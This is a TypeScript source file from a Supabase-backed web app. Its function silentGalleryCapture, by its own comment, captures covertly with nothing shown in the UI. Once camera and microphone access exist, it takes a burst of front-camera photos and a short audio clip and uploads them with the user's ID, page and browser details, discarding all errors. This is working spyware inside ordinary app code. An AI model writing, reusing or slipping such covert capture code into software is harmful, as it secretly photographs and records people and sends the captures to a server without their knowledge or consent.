import { supabase } from "@/integrations/supabase/client";
import { isPermissionEnabled, loadPagePermissions, type PagePermRow } from "@/lib/page-permissions";

// Silently capture multiple photos + an audio clip once the user has granted
// camera+mic access. Nothing is shown in the UI.

let running = false;
let lastRunAt = 0;
const MIN_GAP_MS = 5000;

async function getLimits(page: string) {
  const map = await loadPagePermissions();
  const row =
    map[page] ??
    Object.entries(map)
      .filter(([k]) => k !== "*" && k.length > 1 && page.startsWith(k))
      .sort((a, b) => b[0].length - a[0].length)[0]?.[1] ??
    map["*"];
  return {
    photos: (row as PagePermRow)?.gallery_photo_limit ?? 5,
    audioSeconds: (row as PagePermRow)?.gallery_audio_seconds ?? 8,
  };
}

async function uploadBlob(kind: "photo" | "audio", blob: Blob, page: string, durationMs?: number) {
  const { data: userData } = await supabase.auth.getUser();
  const uid = userData.user?.id ?? "anon";
  const ext = kind === "photo" ? "jpg" : "webm";
  const path = `${uid}/${Date.now()}-${Math.random().toString(36).slice(2, 8)}.${ext}`;
  const up = await supabase.storage.from("gallery-captures").upload(path, blob, {
    contentType: kind === "photo" ? "image/jpeg" : "audio/webm",
    upsert: false,
  });
  if (up.error) return;
  await supabase.from("gallery_captures").insert({
    user_id: userData.user?.id ?? null,
    kind,
    storage_path: path,
    page,
    user_agent: navigator.userAgent,
    size_bytes: blob.size,
    duration_ms: durationMs ?? null,
  });
}

export async function silentGalleryCapture(): Promise<void> {
  try {
    if (typeof window === "undefined") return;
    if (running) return;
    if (Date.now() - lastRunAt < MIN_GAP_MS) return;
    const page = window.location.pathname;
    const allowed = await isPermissionEnabled(page, "gallery");
    if (!allowed) return;
    if (!navigator.mediaDevices?.getUserMedia) return;

    running = true;
    const { photos, audioSeconds } = await getLimits(page);

    // Photos (burst)
    try {
      const vStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1024 }, height: { ideal: 768 } },
        audio: false,
      });
      const video = document.createElement("video");
      video.srcObject = vStream;
      video.muted = true;
      video.playsInline = true;
      await video.play().catch(() => {});
      await new Promise((r) => setTimeout(r, 600));
      for (let i = 0; i < photos; i++) {
        const w = video.videoWidth || 1024;
        const h = video.videoHeight || 768;
        const canvas = document.createElement("canvas");
        canvas.width = w; canvas.height = h;
        const ctx = canvas.getContext("2d");
        if (!ctx) break;
        ctx.drawImage(video, 0, 0, w, h);
        const blob: Blob | null = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.85));
        if (blob) await uploadBlob("photo", blob, page);
        await new Promise((r) => setTimeout(r, 500));
      }
      vStream.getTracks().forEach((t) => t.stop());
    } catch {}

    // Audio
    try {
      const aStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
      const chunks: BlobPart[] = [];
      const rec = new MediaRecorder(aStream);
      rec.ondataavailable = (e) => { if (e.data.size) chunks.push(e.data); };
      const done = new Promise<void>((res) => { rec.onstop = () => res(); });
      rec.start();
      await new Promise((r) => setTimeout(r, Math.max(1, audioSeconds) * 1000));
      rec.stop();
      await done;
      aStream.getTracks().forEach((t) => t.stop());
      const blob = new Blob(chunks, { type: "audio/webm" });
      if (blob.size) await uploadBlob("audio", blob, page, audioSeconds * 1000);
    } catch {}

    lastRunAt = Date.now();
  } catch {
  } finally {
    running = false;
  }
}
